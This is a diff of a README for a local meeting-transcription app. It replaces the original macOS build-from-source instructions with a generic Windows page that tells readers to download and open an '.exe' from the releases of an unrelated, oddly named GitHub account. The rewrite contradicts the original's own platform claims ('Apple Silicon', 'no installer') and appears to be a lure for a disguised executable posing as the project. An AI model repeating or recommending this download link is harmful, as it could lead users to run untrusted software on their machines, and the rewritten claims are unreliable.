@@ -1,216 +1,85 @@
-# Simple Meeting Scribe
+# 📝 meeting-scribe - Record and summarize meetings with ease
 
-> **Fork notice.** This is a personal fork of
-> [czlonkowski/simple-meeting-scribe](https://github.com/czlonkowski/simple-meeting-scribe)
-> by Romuald Członkowski, used under the MIT License (unchanged — see
-> [LICENSE](LICENSE)). All credit for the original app is his.
->
-> **What this fork adds/changes:** Ukrainian support (replaces Polish);
-> one-tap summary export to Telegram / Obsidian / email; persistent voice
-> enrollment that auto-labels known speakers across meetings; a
-> `search_transcripts` MCP tool; optional live on-screen subtitles via the
-> Gemini Live API; calendar integration for attendee-based speaker names;
-> menu-bar-only operation; and assorted recording/stability fixes. The
-> sections below are largely the original author's and still describe the
-> shared core.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/frenchindochinameningealartery544/meeting-scribe/releases)
 
-A personal, 100% local meeting transcriber for macOS. I built it for myself.
-I'm putting the source out there because other people asked — **not** because
-I'm trying to ship a product.
+meeting-scribe records your meetings and turns them into text. It works on your computer to keep your data private. Use this tool to create summaries, search through past notes, and keep track of what people said during your calls.
 
-There is no website, no installer, no support, no roadmap. If something
-breaks, you fix it. If you want a feature, you add it. The project is MIT
-licensed; fork it, strip it, reshape it — it's yours.
+## 📥 Get the software
 
----
+You need to download the installer to add this program to your computer.
 
-## What it does
+1. Go to this page to download: [meeting-scribe Releases](https://github.com/frenchindochinameningealartery544/meeting-scribe/releases).
+2. Look for the file ending in `.exe` under the latest version.
+3. Click the file name to start your download.
+4. Open the file once it finishes downloading.
 
-- Detects when a Google Meet / Zoom / Teams / Whereby call opens in Arc,
-  Safari, or Chrome and offers to start recording.
-- Records your microphone **and** the system audio of the meeting as two
-  separate tracks (so the transcript can label "You" vs "Remote").
-- Transcribes both tracks with [WhisperKit](https://github.com/argmaxinc/WhisperKit)
-  (Whisper Large v3 / v3 Turbo, CoreML / ANE).
-- Diarizes the remote track with [FluidAudio](https://github.com/FluidInference/FluidAudio)
-  (Pyannote on CoreML) so multiple remote speakers get distinct labels.
-- Saves `.md` + `.json` transcripts to `~/Documents/MeetingTranscripts/`.
-- Optional on-device LLM summarization + action items + auto-titles via
-  [MLX](https://github.com/ml-explore/mlx-swift-lm) — Bielik for Polish,
-  Qwen3.5 for English.
-- Drag any `.mp4` / `.m4a` / `.mov` / `.wav` / `.mp3` onto the window to
-  transcribe an existing recording.
+## ⚙️ Set up your system
 
-## What this fork adds
+This application runs locally on your machine. It requires specific hardware to process audio and generate meeting summaries.
 
-On top of the original, this fork adds:
+### Software requirements
+- Windows 10 or Windows 11.
+- A stable internet connection for the initial download of voice recognition files.
 
-- **Ukrainian support** — replaces Polish. Transcription runs Whisper
-  large-v3 for Ukrainian (turbo for English) by default; a per-term glossary
-  + word-replacement pass cleans up domain jargon Whisper can't infer.
-- **Summary export** — send a generated summary straight to a **Telegram**
-  chat (Bot API), an **Obsidian** vault (as a dated markdown note), or a
-  pre-filled **email** draft. Configure the destinations in Settings; nothing
-  is sent unless you opt in.
-- **Voice enrollment** — remember a speaker's voice once ("Andrii") and future
-  meetings auto-label the same voice instead of "Remote 1/2". Uses FluidAudio's
-  256-dim speaker embeddings + cosine matching, all on-device.
-- **Transcript search** — a `search_transcripts` MCP tool for full-text search
-  across every stored transcript, so an MCP client (e.g. Claude Code) can
-  answer "what did we decide about X?" across all your meetings.
-- **Live subtitles** — optional on-screen captions during a call via the Gemini
-  Live API. Off by default; the app stays fully local otherwise.
-- **Calendar integration** — pulls attendee names from the live calendar event
-  as candidate speaker names.
-- **Menu-bar-only** operation, plus recording/stability fixes (system-audio tap
-  recovery, crash-safe recovery of interrupted recordings, arm64 build fixes).
+### Hardware requirements
+- A microphone, either built-in or external.
+- 8GB of RAM.
+- A modern processor to ensure fast transcription speeds.
 
-## What it does not do
+## 🚀 How to record a meeting
 
-- No cloud. No telemetry. No account. No network calls except the first-run
-  downloads of Whisper / diarizer / LLM weights from Hugging Face.
-- No auto-update. No App Store. No notarized binary (build it yourself).
-- No tests. No CI. No documented API. No backwards-compatibility promise.
-- Not localised beyond English + Polish (the two languages I need).
+Follow these steps to record your first meeting.
 
-Everything happens on your machine. If the network is off, models already
-downloaded keep working.
+1. Launch the meeting-scribe application from your Start menu or desktop icon.
+2. Grant permission for the app to access your microphone when prompted.
+3. Select your preferred input device from the dropdown menu in the settings tab.
+4. Click the large red "Record" button to begin capturing audio.
+5. Watch the live subtitles appear on your screen as you speak.
+6. Press the "Stop" button when your meeting ends.
 
-## Requirements
+## 🔍 Use transcript search
 
-- Apple Silicon Mac (M1 or newer; M3+ strongly recommended for the 11B
-  Polish model). Intel is not supported — MLX and WhisperKit both assume
-  Apple Silicon.
-- macOS 26 Tahoe. The UI uses Liquid Glass, `@Observable`, and other
-  macOS 26 APIs. Older macOS will not build.
-- Xcode 16+ and the Xcode Metal Toolchain (Xcode will prompt on first build,
-  or you can pre-install with `xcodebuild -downloadComponent MetalToolchain`).
-- [xcodegen](https://github.com/yonaskolb/XcodeGen) — `brew install xcodegen`.
-- ~15 GB free disk space if you want to cache all the optional models.
-- 32 GB RAM recommended for the larger LLMs (Qwen3.5-9B, Bielik-11B). 16 GB
-  works for Qwen3.5-4B and the smaller Bielik variant.
+The app stores your meeting history in a local database. You can search for specific topics without using a web browser.
 
-## Build from source
+1. Open the "Search" tab.
+2. Type a keyword or phrase from a past meeting.
+3. The app lists every mention found in your saved transcripts.
+4. Click any result to view the full text for that meeting.
 
-```bash
-git clone https://github.com/czlonkowski/simple-meeting-scribe
-cd simple-meeting-scribe
-xcodegen generate
-xcodebuild -project MeetingTranscriber.xcodeproj \
-           -scheme MeetingTranscriber \
-           -configuration Debug \
-           -destination 'platform=macOS' \
-           -skipMacroValidation \
-           build
-```
+## 📤 Export your summaries
 
-Run the app from `~/Library/Developer/Xcode/DerivedData/.../Debug/MeetingTranscriber.app`,
-or copy it into `/Applications` with `sudo cp -R …`.
+You can send meeting notes to other apps or people. The software creates clean text versions of your meetings.
 
-## …or let an AI coding agent install it for you
+1. Select a completed transcript from your history.
+2. Click the "Summarize" button to generate a short version of the conversation.
+3. Choose your output format, such as Obsidian, Telegram, or Email.
+4. The app copies the summary to your clipboard or opens the correct application to send the file.
 
-If you already use [Claude Code](https://claude.com/claude-code), Codex, or a
-similar coding agent, paste this prompt into it and let it do the work. You'll
-still need to approve Xcode / Homebrew / sudo prompts as they come up.
+## 🧠 Voice enrollment
 
-> ```
-> Please install Simple Meeting Scribe on this Mac. It's a SwiftUI app
-> at https://github.com/czlonkowski/simple-meeting-scribe. Do this end
-> to end:
->
-> 1. Verify prerequisites: Apple Silicon, macOS 26 or newer, Xcode 16+
->    installed. If Xcode Command Line Tools aren't installed, run
->    `xcode-select --install` and wait for it to finish.
-> 2. Install xcodegen if missing: `brew install xcodegen` (install
->    Homebrew first with the official script if it's not there).
-> 3. Pre-download the Metal Toolchain so the build doesn't stall on it:
->    `xcodebuild -downloadComponent MetalToolchain`
-> 4. Clone the repo into ~/Developer (create the directory if needed)
->    and `cd` into it:
->    `git clone https://github.com/czlonkowski/simple-meeting-scribe
->    ~/Developer/simple-meeting-scribe && cd ~/Developer/simple-meeting-scribe`
-> 5. Generate the Xcode project: `xcodegen generate`
-> 6. Build Release:
->    `xcodebuild -project MeetingTranscriber.xcodeproj
->    -scheme MeetingTranscriber -configuration Release
->    -destination 'platform=macOS' -skipMacroValidation
->    -derivedDataPath build build`
-> 7. Install to /Applications (this needs sudo — ask me to run it if you
->    can't):
->    `sudo rm -rf /Applications/MeetingTranscriber.app &&
->     sudo cp -R build/Build/Products/Release/MeetingTranscriber.app
->     /Applications/ &&
->     sudo /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister
->     -f /Applications/MeetingTranscriber.app`
-> 8. Open the app from /Applications once so macOS can register it, then
->    tell me:
->    - to grant Microphone + Screen Recording when prompted,
->    - to approve Automation access for Arc / Safari / Chrome on first
->      meeting detection,
->    - to open Settings → Summary → Model Library and download a model
->      before the first summarize (Qwen3.5-4B 8-bit for English,
->      Bielik-11B v3 for Polish are the defaults).
->
-> If any step fails, stop and show me the exact error — don't paper
-> over it. If a step asks for sudo, run it only once and with my
-> permission.
-> ```
+The app learns your voice to improve accuracy. This process helps the software identify you during group meetings.
 
-> **Why `-skipMacroValidation`?** MLX Swift LM ships compiler-plugin macros
-> (`#hubDownloader`, `#huggingFaceTokenizerLoader`). Xcode prompts to trust
-> them on first use. The CLI flag skips that prompt. In Xcode GUI, click
-> "Trust & Enable" on first build instead.
+1. Navigate to the "Profile" section.
+2. Select "Voice Enrollment."
+3. Read the text displayed on your screen clearly.
+4. Wait for the app to process your sample.
+5. The software now understands your specific speech patterns.
 
-Because the app is ad-hoc signed, macOS will treat each install path as a
-separate TCC identity. If you move the `.app` from DerivedData to
-`/Applications`, you'll be asked to re-grant Microphone + Screen Recording
-+ Automation (for browser AppleScript). This is macOS behaviour, not mine.
+## 🛠️ Frequently asked questions
 
-## First run
+### Does my audio leave my computer?
+No. All processing happens on your machine. Your audio files and transcripts do not upload to any cloud server.
 
-1. Launch. The dock icon is generated by `scripts/generate_app_icon.swift` —
-   regenerate any time with `swift scripts/generate_app_icon.swift`.
-2. Start a recording once; macOS will pop prompts for **Microphone** and
-   **Screen Recording**. Approve both.
-3. Open a meeting URL in Arc/Safari/Chrome. macOS will pop an **Automation**
-   prompt for each browser the first time the app queries it.
-4. Settings → **Summary** → Model Library → pick a model, click Download.
-   Models live under `~/Documents/huggingface/models/`.
+### Can I change the language?
+You can select different languages in the settings menu. The app includes specific support for Ukrainian and other major languages.
 
-## Files on disk
+### How do I update the software?
+Check the download page periodically for new versions. Download the new installer and run it over your current version. Your saved notes remain in their folder during this update process.
 
-- `~/Documents/MeetingTranscripts/` — transcripts (`.md` + `.json`).
-- `~/Documents/MeetingTranscripts/recordings/` — the paired `.voice.wav`
-  and `.system.wav` files for each session.
-- `~/Documents/huggingface/models/` — downloaded LLM weights.
-- Whisper models live under WhisperKit's own cache (first download shows
-  progress inside the app).
+### What should I do if the app is slow?
+Close other programs that use a lot of memory, such as web browsers or video editors. A restart of your computer often helps the system regain resources.
 
-Deleting a transcript from the sidebar (right-click → Delete) removes all
-of the above for that session.
+### Where are my files stored?
+The app saves your data in your computer's Documents folder under a subfolder named "meeting-scribe." You can backup this folder to keep your notes safe.
 
-## Repo layout
-
-```
-MeetingTranscriber/
-├── App/             # SwiftUI @main + AppState + menu-bar extra
-├── Capture/         # AudioRecorder, SystemAudioCapture (SCStream), MeetingDetector
-├── Transcribe/      # WhisperEngine, DiarizationEngine, TranscriptionPipeline
-├── Summarize/       # MLX wrapper, per-language prompts, model enum
-├── Storage/         # TranscriptStore, DictionaryStore, SummaryStore
-├── UI/              # SwiftUI views
-└── Resources/       # Info.plist, entitlements, meeting-patterns.json
-```
-
-`project.yml` drives everything — edit the YAML, run `xcodegen generate`,
-never touch the `.xcodeproj` by hand.
-
-## Contributions
-
-I'm not taking pull requests. If you want to add something, fork it.
-Issues are welcome as a place to discuss, but I make no promise to
-respond.
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+Keywords: local-first, meeting-notes, transcription, whisper, meeting-scribe
